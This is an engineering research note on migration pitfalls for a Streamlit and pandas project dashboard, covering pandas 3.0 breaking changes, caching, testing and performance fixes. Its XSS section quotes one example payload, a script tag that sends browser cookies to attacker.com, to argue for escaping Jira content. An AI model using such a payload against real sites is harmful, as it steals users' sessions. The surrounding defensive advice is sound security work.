# Pitfalls Research

**Research Date:** 2026-03-25
**Project:** Dashboard Fase 3 — GCP to AWS Migration Tracker
**Stack:** Python 3.11, Streamlit 1.55, Plotly 5.24, Pandas 2.2.3, NumPy 2.2.1

This document answers: "What will hurt us when we touch this codebase?" It is consumed by
the planner to embed verification steps and safeguards into task definitions.

---

## Pandas 2.x → 3.x Breaking Changes

**Confidence: HIGH** — Verified against official pandas 3.0.0 release notes (released 2026-01-21)
and the official pandas string migration guide.

### 1. `fillna(method='ffill')` — REMOVED

Status in this codebase: **CONFIRMED PRESENT** at `app/dashboard/dashboard.py` line 48
inside `calcular_curva_aprendizado()`.

In pandas 2.2.x this raises a `FutureWarning`. In pandas 3.0 the `method=` parameter of
`fillna()` is completely removed and raises `TypeError`.

```python
# BREAKS on pandas 3.0
df.fillna(method='ffill')
df.fillna(method='bfill')

# CORRECT — works on pandas 2.1+ and 3.0
df.ffill()
df.bfill()
```

### 2. `DataFrame.applymap()` — REMOVED

Status in this codebase: **CONFIRMED PRESENT** at `app/dashboard/dashboard.py` line 1214
in `df_render.style.applymap(colorir_status, subset=['Status'])`.

`applymap` was deprecated in pandas 1.4 and renamed to `map`. It is fully removed in 3.0
and raises `AttributeError`.

```python
# BREAKS on pandas 3.0
df.applymap(func)
df.style.applymap(func, subset=[...])

# CORRECT
df.map(func)
df.style.map(func, subset=[...])
```

### 3. String dtype change: `object` → `str`

**Impact on this codebase: MEDIUM RISK** — CSV columns are read with `pd.read_csv()` and
likely use string columns. Any code that checks `dtype == 'object'` or
`dtype == object` will silently fail to match in pandas 3.0 because string columns now
carry dtype `str` (a pandas extension dtype, not a NumPy object).

Common patterns that break:

```python
# dtype check — breaks silently in pandas 3.0
if col.dtype == object: ...           # False for string columns
if col.dtype == 'object': ...         # False for string columns

# select_dtypes — breaks silently
df.select_dtypes(include=['object'])  # No longer returns string columns

# CORRECT — compatible with 2.x and 3.x
import pandas.api.types as pat
pat.is_string_dtype(col)              # True in both versions
df.select_dtypes(include=['object', 'string'])  # Both versions
```

Status and Issue columns in `FASE_3.csv` are string columns. Any filtering logic that
relies on dtype checks will silently break.

### 4. Copy-on-Write (CoW) — Now mandatory

In pandas 3.0, CoW is permanent and `SettingWithCopyWarning` is removed. Chained
assignment silently fails instead of sometimes working.

```python
# Chained assignment — silently does nothing in pandas 3.0
df[df['Status'] == 'Done']['Pontos'] = 0   # No effect, no error

# CORRECT
df.loc[df['Status'] == 'Done', 'Pontos'] = 0
```

The monolith dashboard.py at 2,351 lines almost certainly contains chained assignment
patterns. These will silently produce wrong results, not errors, making them hard to
detect without tests.

### 5. Datetime resolution change: nanoseconds → microseconds

`pd.read_csv()` and `pd.to_datetime()` now infer microsecond resolution by default instead
of nanosecond. This affects any code that converts datetime to integer for arithmetic.

```python
# Old: datetime64[ns]  → int64 in nanoseconds
# New: datetime64[us]  → int64 in microseconds (1000x smaller!)

# CORRECT — explicit unit
ts.dt.as_unit('ns').astype('int64')
```

SLA calculations that use datetime arithmetic may be affected if they ever convert to
integer representation.

### 6. Removed offset aliases

`M`, `Q`, `Y` for `resample()`, `date_range()`, and `Grouper` are removed. Use `ME`, `QE`,
`YE` respectively. Any burndown/burnup date range logic using these aliases breaks.

### 7. `inplace=True` return value change

`fillna(inplace=True)` and similar methods now return `self` instead of `None`. Code
patterns that check `result is None` to confirm in-place operation will break.

### Migration Path for This Codebase

| Fix | File | Line | Effort |
|-----|------|------|--------|
| `fillna(method='ffill')` → `.ffill()` | dashboard.py | 48 | Trivial |
| `style.applymap` → `style.map` | dashboard.py | 1214 | Trivial |
| Audit chained assignments | dashboard.py | multiple | Medium |
| Audit dtype == object checks | dashboard.py | multiple | Medium |
| Enable `pd.options.future.infer_string = True` in dev | — | — | Low |

**Recommended:** Set `pd.options.future.infer_string = True` in the test suite to simulate
pandas 3.0 string behavior before upgrading. Run the full dashboard to surface hidden dtype
check failures.

---

## Streamlit Caching Gotchas

**Confidence: HIGH** — Verified against official Streamlit docs for `st.cache_data` and
the caching architecture overview.

### 1. External file changes do NOT invalidate the cache

`@st.cache_data` hashes function arguments and source code. It does NOT watch the
filesystem. When CI commits new CSV files to `app/dados/`, a running Streamlit instance
will keep serving stale data until:

- The app restarts (process restart)
- `ttl` expires (if set)
- `st.cache_data.clear()` is called manually

**Fix for this project:** Add `ttl` matching the CI update interval (every 15 minutes on
weekdays):

```python
@st.cache_data(ttl=900)  # 15 minutes = 4× per hour, matches CI schedule
def carregar_dados():
    ...
```

Alternatively, pass the file's modification timestamp as a parameter to force
recomputation when the file changes:

```python
import os
@st.cache_data
def carregar_dados(mtime=None):   # mtime passed by caller
    ...

mtime = os.path.getmtime("app/dados/FASE_3.csv")
df = carregar_dados(mtime=mtime)  # Cache miss when file updates
```

### 2. Mutable return value — cache corruption with `st.cache_resource`

`st.cache_data` creates a pickled copy per caller, so mutations are safe. But if code is
ever changed to use `st.cache_resource` (e.g., for a shared connection or model), any
caller that mutates the returned object corrupts the shared cache for all subsequent
callers.

Current risk: LOW (project uses `@st.cache_data` or no caching). Monitor if refactor
introduces `st.cache_resource`.

### 3. Unhashable parameters raise `UnhashableParamError`

If a function decorated with `@st.cache_data` receives an argument that Streamlit cannot
hash (e.g., a DataFrame, a custom class, a lambda), it raises `UnhashableParamError` at
runtime.

**Safe patterns:**

```python
# Prefix with _ to exclude from hash (skip caching on that arg)
@st.cache_data
def process(_df, threshold):  # _df not hashed
    ...

# Or use hash_funcs for custom types
@st.cache_data(hash_funcs={pd.DataFrame: lambda df: df.shape})
def process(df):
    ...
```

### 4. TTL is silently ignored when `persist="disk"`

```python
# BUG: ttl is ignored here — disk cache never expires
@st.cache_data(ttl=900, persist="disk")
def load():
    ...
```

Do not combine `ttl` with `persist="disk"`. If persistent caching is used, cache
invalidation must be manual.

### 5. Async functions cannot be cached

`@st.cache_data` does not support `async def` functions. If any data loading function is
later made async, caching silently breaks.

### 6. Pickle security — do not cache untrusted data

`@st.cache_data` uses pickle under the hood. Loading data from external sources (e.g.,
raw Jira API payloads) into a cached function is safe for this project because the Jira
API is trusted. However, if the cache is persisted to disk (`persist="disk"`) and the disk
is compromised, unpickling the cache file executes arbitrary code.

### 7. Cache miss on every restart (no disk persistence by default)

The in-memory cache is lost on every Streamlit restart. In Codespaces, if the Streamlit
process is restarted, the first page load after restart re-reads all 9 CSV files from disk
regardless of `ttl`. This is expected behavior, not a bug, but it means warm-up latency
exists after deployments.

### 8. `calcular_ciclo_desenvolvimento()` imports inside the function body

The function at line 615 does `import glob` inside its body. If this function is wrapped
with `@st.cache_data`, Streamlit hashes the function's bytecode including the import
statement. This is functionally correct but slightly unusual; the import inside a cached
function will only execute on cache miss.

---

## Streamlit Testing Limitations

**Confidence: HIGH** — Verified against official Streamlit AppTest documentation and
community discussions.

### What Streamlit's AppTest CAN do

`streamlit.testing.v1.AppTest` simulates app execution headlessly:
- Run the script and inspect widget state
- Simulate widget interactions (clicks, text input, select changes)
- Read text output, metrics, and dataframe elements
- Access and set `session_state`, `secrets`, `query_params`
- Run with pytest without a browser

### What AppTest CANNOT do

| Limitation | Impact on This Project |
|------------|------------------------|
| **Plotly charts are opaque** — `app.get("plotly_chart")` returns `UnknownElement()`, chart data cannot be inspected | Cannot verify burndown/burnup chart correctness via AppTest |
| **No multipage navigation** — must manually set session_state to simulate page transitions | Tab switching (Executivo, Gráficos, Detalhes, Pendências) cannot be tested end-to-end |
| **Custom components unsupported** — any `st.components.v1` calls return UnknownElement | Not currently a concern; project uses no custom components |
| **No screenshot/visual diffing** — cannot assert on chart appearance, colors, or layout | Theme switching (dark/light) cannot be verified automatically |
| **Async not supported** — `AppTest` cannot handle async functions | Not currently a concern |
| **No file watching** — does not simulate CI file updates | Stale cache behavior cannot be simulated |

### Practical testing strategy for this codebase

Given the monolith structure and Streamlit's AppTest limitations, the viable testing
approach is a two-layer strategy:

**Layer 1 — Pure logic unit tests (pytest, no Streamlit):**
Extract calculation functions and test them in isolation. These are testable without
AppTest:

- `calcular_curva_aprendizado()` — sigmoid math, testable with fixture DataFrames
- `calcular_dias_uteis()` — business-days count, testable with date pairs
- `dias_uteis_restantes()` — SLA countdown logic
- `calcular_burndown()` / `calcular_burnup()` — projection math
- `parse_data_criacao()` — date parsing edge cases (the silent bare `except:` is a test target)
- `carregar_dados()` — CSV parsing, column presence, schema validation

**Layer 2 — Streamlit AppTest smoke tests:**
Test that the app starts without crashing and widgets exist with expected state. Do NOT
try to assert chart correctness through AppTest.

```python
from streamlit.testing.v1 import AppTest

def test_app_loads():
    at = AppTest.from_file("app/dashboard/dashboard.py")
    at.run(timeout=30)
    assert not at.exception

def test_tab_selector_exists():
    at = AppTest.from_file("app/dashboard/dashboard.py")
    at.run(timeout=30)
    # Check sidebar filter exists
    assert len(at.selectbox) >= 1
```

**Layer 3 — Manual verification:**
Chart correctness (burndown shape, projection bands, heatmap colors) requires visual
inspection. Document expected outputs as golden fixtures (screenshot or data snapshot)
rather than automated assertions.

### The testability wall

The monolith structure (2,351-line single file with calculations inline with rendering)
makes unit-testing the calculation logic difficult because functions cannot be imported in
isolation — the module runs Streamlit calls at import time. The correct fix is extracting
calculations to `calculations.py` first, but PROJECT.md marks this as "out of scope"
pending test coverage. This is a chicken-and-egg problem.

**Pragmatic resolution:** Write tests that import only the specific functions needed,
mocking `streamlit` at the module level:

```python
import unittest.mock
with unittest.mock.patch.dict('sys.modules', {'streamlit': unittest.mock.MagicMock()}):
    import importlib
    dashboard = importlib.import_module('app.dashboard.dashboard')
    result = dashboard.calcular_dias_uteis(start, end)
```

This avoids the full Streamlit execution while still testing calculation logic before the
refactor is done.

---

## unsafe_allow_html Security

**Confidence: HIGH** — Verified against Streamlit security advisory CVE-2023-27494 (Snyk
SNYK-PYTHON-STREAMLIT-3362246) and official Streamlit documentation.

### Risk Level for This Project

**Current risk: LOW** — The dashboard runs on an internal Codespaces environment, not
exposed to the public internet. However, risk becomes MEDIUM-HIGH if:
- The Codespaces port is ever made public (one-click in VS Code)
- The dashboard is deployed to a public URL
- A Jira issue title is crafted with malicious HTML by an adversary with Jira access

The dashboard reads issue titles and descriptions from Jira and renders them via
`st.markdown(..., unsafe_allow_html=True)`. A Jira issue titled:
`<script>document.location='https://attacker.com/?c='+document.cookie</script>`
would execute in the viewer's browser if the dashboard were public-facing.

### What `unsafe_allow_html=True` actually allows

Streamlit normally strips all HTML from markdown strings. With `unsafe_allow_html=True`,
raw HTML tags pass through to the browser DOM. Streamlit does not apply its own
sanitization. The browser will execute any JavaScript in `<script>` tags, `onclick=`
handlers, `href="javascript:"`, `onerror=` in `<img>` tags, etc.

### CVE-2023-27494

A reflected XSS was found in Streamlit when `unsafe_allow_html=True` is combined with
query parameter injection. Patched in Streamlit 1.20.0. Project is on 1.55, so this
specific CVE is resolved — but the general pattern remains valid.

### Minimum viable mitigation

The minimum mitigation is HTML-escaping all Jira-sourced dynamic content before inserting
it into HTML template strings. Python's standard library provides `html.escape()`:

```python
import html

# BEFORE (vulnerable if jira_title contains HTML)
st.markdown(f"<div>{jira_title}</div>", unsafe_allow_html=True)

# AFTER (safe — angle brackets converted to &lt; &gt;)
safe_title = html.escape(jira_title)
st.markdown(f"<div>{safe_title}</div>", unsafe_allow_html=True)
```

`html.escape()` replaces: `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, `"` → `&quot;`,
`'` → `&#x27;`.

For richer sanitization (allow some tags like `<b>`, `<i>` but strip `<script>`), use
the `bleach` library:

```python
import bleach
safe = bleach.clean(jira_html, tags=['b', 'i', 'em', 'strong'], strip=True)
```

### What mitigation does NOT help with

- Static hardcoded HTML strings — no escaping needed, these are safe already
- CSS injection through `style=` attributes — bleach handles this; `html.escape()` does not
- If the Jira API token is compromised — attackers could craft issues with arbitrary content
- SSL verification is disabled (`verify=False`), so a MITM attacker could inject content
  at the network layer before the dashboard ever receives it — this is the more severe
  risk documented in CONCERNS.md

### Priority

Given the controlled-network deployment, escaping is LOW urgency but HIGH value as a
one-time fix. The work is small: find all `st.markdown(..., unsafe_allow_html=True)` calls
that embed variables from Jira data and wrap those variables in `html.escape()`.

---

## Performance Bottlenecks

**Confidence: HIGH** — Confirmed by CONCERNS.md audit and official Streamlit performance
documentation.

### Bottleneck 1: 9 CSV disk reads on every interaction (CRITICAL)

`calcular_ciclo_desenvolvimento()` calls `glob.glob()` and `pd.read_csv()` for 9 history
files inside a function with no `@st.cache_data`. Every widget interaction (filter change,
tab switch, sidebar select) triggers a full Python re-execution of `dashboard.py`, meaning
9 disk reads happen on every user click.

Similarly, `carregar_dados()` reads `FASE_3.csv` on every render.

**Fix:** Add `@st.cache_data(ttl=900)` to both functions. First interaction reads from
disk; subsequent interactions are served from memory in microseconds.

Expected impact: Transforms the most common user interaction from ~1-3 seconds (disk I/O
× 10 files) to ~5-50 milliseconds (memory copy of cached DataFrames).

### Bottleneck 2: Python `while` loop for business-day counting (HIGH)

`dias_uteis_restantes()` at lines 2158–2171 counts business days by incrementing day-by-day
in a `while` loop. This is O(n_days) per row. With 9 data lakes × N pending issues, it
runs O(9 × N × D) operations where D is the number of days to the deadline.

The codebase already contains `calcular_dias_uteis()` at line 592 which uses
`np.busday_count()` — an O(1) vectorized operation.

**Fix:** Replace the `while` loop with `np.busday_count(hoje_d, deadline)` consistent
with the existing helper.

### Bottleneck 3: Plotly chart JSON serialization (MEDIUM)

Streamlit serializes Plotly figures to JSON before sending them to the browser.
Without `orjson`, this serialization is slow for figures with many data points (burndown
with daily granularity, history scatter plots).

**Fix:** `pip install orjson`. No code changes required. Streamlit automatically detects
and uses `orjson` when present, providing up to 8× faster chart serialization (from ~550ms
to ~64ms per chart, per Streamlit's own benchmark in PR #7860).

### Bottleneck 4: Row-by-row Python iteration in history analysis (MEDIUM)

`calcular_ciclo_desenvolvimento()` uses nested Python loops to iterate every row of the
combined history DataFrame across 9 files. For large history datasets this is O(N × M)
where N = issues and M = history items per issue. Pandas operations should replace these
loops.

**Fix:** Vectorize using `groupby().apply()`, `pd.merge()`, and date arithmetic on Series
instead of iterating rows.

### Bottleneck 5: Full re-execution on every widget interaction (LOW — structural)

Streamlit re-runs the entire `dashboard.py` on every user interaction. In a 2,351-line
monolith with all computation inline, this means every select box change re-executes
2,351 lines of Python even if only one chart needs updating.

This is the structural cost of the monolith design. The partial mitigation (without a
refactor) is ensuring all expensive operations are behind `@st.cache_data`. The full
mitigation requires the module separation that is currently out of scope.

### Bottleneck 6: Multiple `st.plotly_chart` calls with large figures (LOW)

When multiple Plotly figures are rendered on the same page (burndown + burnup + learning
curve + development cycle × 9 lakes), each chart is serialized and sent to the browser
independently. More than 8 charts on one page can cause rendering failures in some
environments (community-reported).

**Mitigation:** Ensure charts are inside conditional blocks or tabs so only the visible
tab's charts are rendered. Streamlit does not lazy-render off-screen tabs by default, but
wrapping chart code in `if active_tab == "Gráficos":` prevents rendering when the tab is
not selected.

---

## Recommended Risk Mitigations

Ordered by impact-to-effort ratio, validated against the known issues in CONCERNS.md:

### Priority 1 — Fix pandas deprecations (before any pandas upgrade)
**Effort:** 30 minutes | **Risk if skipped:** Runtime failure on pandas 3.0

1. Replace `df.fillna(method='ffill')` with `df.ffill()` at dashboard.py line 48
2. Replace `df.style.applymap(...)` with `df.style.map(...)` at dashboard.py line 1214
3. Enable `pd.options.future.infer_string = True` in `conftest.py` to surface hidden
   dtype-check breakage early

### Priority 2 — Add `@st.cache_data(ttl=900)` to data loading
**Effort:** 1 hour | **Risk if skipped:** Slow UX on every interaction, worsens as new
views are added

1. Add `@st.cache_data(ttl=900)` to `carregar_dados()` at line 383
2. Add `@st.cache_data(ttl=900)` to the history-loading block inside
   `calcular_ciclo_desenvolvimento()` at line 609 — or extract to a separate cached
   function
3. Pass `mtime` of the CSV file as a parameter if TTL-based expiry is too coarse

### Priority 3 — Install `orjson`
**Effort:** 5 minutes | **Risk if skipped:** Slow chart rendering

1. Add `orjson` to `requirements.txt`
2. No code changes needed

### Priority 4 — Replace `while` loop with `np.busday_count`
**Effort:** 30 minutes | **Risk if skipped:** Quadratic slowdown as pending items grow

1. Replace `dias_uteis_restantes()` body at lines 2158–2171 with `np.busday_count()`
   (consistent with `calcular_dias_uteis()` at line 592)

### Priority 5 — HTML-escape Jira content before `unsafe_allow_html=True`
**Effort:** 2 hours | **Risk if skipped:** XSS if dashboard is ever public-facing

1. Audit all `st.markdown(..., unsafe_allow_html=True)` calls in dashboard.py
2. For each call that embeds a variable sourced from Jira data (issue titles,
   descriptions, assignee names), wrap the variable in `html.escape(var)`
3. Static HTML string literals do not need escaping

### Priority 6 — Replace bare `except:` in `parse_data_criacao()`
**Effort:** 15 minutes | **Risk if skipped:** Silent data corruption in date parsing

1. Replace `except:` with `except (ValueError, TypeError) as e:` at line 536
2. Log the error with `st.warning()` or `print()` so failures are visible

### Priority 7 — Fix `Historia` column KeyError
**Effort:** 15 minutes | **Risk if skipped:** Runtime `KeyError` when "Exibir todas as
colunas" is toggled

1. Guard `df_filtrado['Historia']` at line 1912 with
   `if 'Historia' in df_filtrado.columns:` or use `.get('Historia')` pattern

### Priority 8 — Write unit tests for calculation functions
**Effort:** 4-8 hours | **Risk if skipped:** Unsafe to refactor, no regression safety

1. Use the `sys.modules` mock pattern to import calculation functions without running
   Streamlit
2. Test: `calcular_dias_uteis`, `calcular_curva_aprendizado`, `parse_data_criacao`,
   `carregar_dados` (with mock CSVs)
3. Test Jira pipeline scripts with mocked `requests.get` responses

---

## Sources

### Primary (HIGH confidence)
- [pandas 3.0.0 What's New (official)](https://pandas.pydata.org/docs/whatsnew/v3.0.0.html)
- [pandas 3.0 String Migration Guide (official)](https://pandas.pydata.org/docs/user_guide/migration-3-strings.html)
- [Streamlit `st.cache_data` API Reference (official)](https://docs.streamlit.io/develop/api-reference/caching-and-state/st.cache_data)
- [Streamlit Caching Architecture Overview (official)](https://docs.streamlit.io/develop/concepts/architecture/caching)
- [Streamlit AppTest Beyond the Basics (official)](https://docs.streamlit.io/develop/concepts/app-testing/beyond-the-basics)
- [Streamlit App Testing Overview (official)](https://docs.streamlit.io/develop/api-reference/app-testing)

### Secondary (MEDIUM confidence)
- [CVE-2023-27494 XSS in Streamlit — Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-STREAMLIT-3362246)
- [Streamlit Security Advisory 2023-03-08](https://streamlit.io/advisories/streamlit-security-advisory-2023-03-08)
- [Streamlit PR #7860 — orjson 8× speedup for st.plotly_chart](https://github.com/streamlit/streamlit/pull/7860)
- [Streamlit Forum — FAQ: How to improve performance of apps with large data](https://discuss.streamlit.io/t/faq-how-to-improve-performance-of-apps-with-large-data/64007)
- [Streamlit Forum — Every security aspect of unsafe_allow_html](https://discuss.streamlit.io/t/every-security-aspects-of-allow-unsafe_html/66498)
- [Real Python — pandas 3.0 Lands Breaking Changes (Feb 2026)](https://realpython.com/python-news-february-2026/)

### Tertiary (LOW — needs validation)
- [Medium — Pandas 3.0 CoW Migration Guide (Jan 2026)](https://medium.com/@kaushalsinh73/pandas-3-0-copy-on-write-migration-guide-the-surprising-performance-wins-and-the-silent-footguns-f6e76db73551)

---

*Research complete — 2026-03-25*
